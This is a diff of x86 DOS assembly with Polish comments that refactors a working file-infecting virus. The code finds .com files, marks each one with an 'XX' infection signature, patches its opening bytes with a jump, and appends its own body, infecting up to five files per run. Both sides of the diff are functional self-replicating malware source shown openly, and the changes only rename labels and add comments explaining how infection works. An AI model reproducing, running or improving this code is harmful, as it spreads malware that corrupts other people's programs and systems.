@@ -4,79 +4,84 @@ P21H_PLIK_SZUKAJ_MASKA equ 4e00h
 P21H_PLIK_SZUKAJ_NASTEPNEGO equ 4fh
 P21H_PLIK_OTWORZ equ 3dh
 P21H_PLIK_ODCZYTAJ equ 3fh
-P21H_PLIK_WSKAZNIK_PRZESUN equ 42h
 P21H_PLIK_ZAPISZ equ 40h
 P21H_PLIK_ZAMKNIJ equ 3eh
+P21H_PLIK_WSKAZNIK_PRZESUN equ 42h
 P21H_PLIK_WSKAZNIK_KONIEC equ 02h
 P21H_PLIK_TRYB_ODCZYT equ 0h
 P21H_P_TRYB_ODCZYT_ZAPIS equ 2h
+P21H_DTA_OFFSET equ 80h
+P21H_PLIK_ROZMIAR_OFFSET equ 1ah
+P21H_PLIK_NAZWA_OFFSET equ 9eh
 
-PLIK_ATRYBUTY equ 0fh
-ZARAZONY_MASKA equ 'XX'
-ZARAZENIE_PLIK_LICZBA equ 5h
+PLIK_SZUKAJ_ATRYBUTY equ 7h
+PLIK_ZARAZONY_ZNACZNIK equ 'XX'
+PLIK_POCZATEK_DLUGOSC equ 1ah
+P_ZARAZONY_ZNACZNIK_OFFSET equ 3h
+LICZBA_DO_ZARAZENIA equ 5h
 
 org 100h
 
 start:
+; skok dwie instrukcje dalej zapisany jako ciąg bajtów
   db 0e9h, 2h, 0h
-  dw ZARAZONY_MASKA
+  dw PLIK_ZARAZONY_ZNACZNIK
 plik_zarazenie:
+; obliczenie przesunięcia wszystkich etykiet w programie i zapisanie w bp
   call przesuniecie
 przesuniecie:
-; pobranie rejestru ip do bp
   pop bp
-; cofnięcie do instrukcji plik_zarazanie, instrukcja call zajmuje 3B
   sub bp, przesuniecie
+; po wejściu w kod wirusa przywrócenie pierwotnego początku pliku
   lea si, [bp + plik_poczatek]
   mov di, 100h
+; adres powrotu do początku programu na stos
   push di
   movsb
   movsw
   movsw
-  mov [bp + licznik], byte 0h
+  mov [bp + pliki_zarazone_licznik], byte 0h
   lea dx, [bp + plik_maska]
-  cmp [bp + licznik], ZARAZENIE_PLIK_LICZBA
-  ja plik_zarazanie_koniec
+  cmp [bp + pliki_zarazone_licznik], LICZBA_DO_ZARAZENIA
+  ja plik_zarazenie_koniec
   mov ax, P21H_PLIK_SZUKAJ_MASKA
-  mov cx, PLIK_ATRYBUTY
+  mov cx, PLIK_SZUKAJ_ATRYBUTY
 plik_szukaj:
   int 21h
-  jc plik_zarazanie_koniec
-  call zarazanie
+  jc plik_zarazenie_koniec
+  call zarazenie
   mov ah, P21H_PLIK_SZUKAJ_NASTEPNEGO
   jmp plik_szukaj
-plik_zarazanie_koniec:
+plik_zarazenie_koniec:
   retn
   
-zarazanie:
-; odczytanie nagłówka zarażanego pliku
+zarazenie:
   mov al, P21H_PLIK_TRYB_ODCZYT
   call plik_otworz
   mov ah, P21H_PLIK_ODCZYTAJ
-  mov cx, 1ah
+  mov cx, PLIK_POCZATEK_DLUGOSC
   lea dx, [bp + bufor]
   int 21h
   mov ah, P21H_PLIK_ZAMKNIJ
   int 21h
-  mov bx, word [bp + 80h + 1ah]
-; sprawdzenie czy plik jest już zarażony
-  cmp word [cs:bp + bufor + 3h], ZARAZONY_MASKA
-  je zarazanie_koniec
-; zmniejszenie wielkości zbioru o instrukcję JMP
+; pobranie wielkości zarażanego pliku
+  mov bx, word [bp + P21H_DTA_OFFSET + P21H_PLIK_ROZMIAR_OFFSET]
+  cmp word [cs:bp + bufor + P_ZARAZONY_ZNACZNIK_OFFSET], PLIK_ZARAZONY_ZNACZNIK
+  je zarazenie_koniec
+; obliczenie adresu skoku do wirusa jako wielkość pliku - długość instrukcji skoku
   sub bx, 3h
-; zachowanie pierwotnych 3B zarażanego pliku
+; zachowanie pierwotnego początku zarażanego pliku
   lea si, [bp + bufor]
   lea di, [bp + plik_poczatek]
   movsb
   movsw
   movsw
-; podmiana pierwszego bajtu na instrukcję JMP, kod 9eh
+; podmiana pierwszego bajtu na instrukcję skoku
   mov [bp + bufor], byte 0e9h
-; zapisanie nowej wielkości zbioru
+; zapisanie adresu skoku do wirusa
   mov word [bp + bufor + 1h], bx
-; oznaczenie pliku jako zarażony
-  mov word [bp + bufor + 3h], ZARAZONY_MASKA
-; podmiana nagłówka zarażanego pliku
+  mov word [bp + bufor + P_ZARAZONY_ZNACZNIK_OFFSET], PLIK_ZARAZONY_ZNACZNIK
+; podmiana początkowych pięciu bajtów zarażanego pliku
   mov al, P21H_P_TRYB_ODCZYT_ZAPIS
   call plik_otworz
   mov ah, P21H_PLIK_ZAPISZ
@@ -91,19 +96,19 @@ zarazanie:
   xor dx, dx
   int 21h
   mov ah, P21H_PLIK_ZAPISZ
-  mov cx, plik_koniec - plik_zarazenie
+  mov cx, koniec - plik_zarazenie
   lea dx, [bp + plik_zarazenie]
   int 21h
-  inc [bp + licznik]
+  inc [bp + pliki_zarazone_licznik]
 plik_zamknij:
   mov ah, P21H_PLIK_ZAMKNIJ
   int 21h
-zarazanie_koniec:
+zarazenie_koniec:
   ret
   
 plik_otworz:
   mov ah, P21H_PLIK_OTWORZ
-  mov dx, 9eh
+  mov dx, P21H_PLIK_NAZWA_OFFSET
   int 21h
 ; uchwyt pliku do ax
   xchg ax, bx
@@ -111,8 +116,8 @@ plik_otworz:
   
 plik_maska db "*.com", 0h
 plik_poczatek db 0cdh, 20h, 0, 0, 0
-licznik db 0h
-bufor: times 1ah db ?
+pliki_zarazone_licznik db 0h
+bufor: times PLIK_POCZATEK_DLUGOSC db ?
 
-plik_koniec:
+koniec:
 
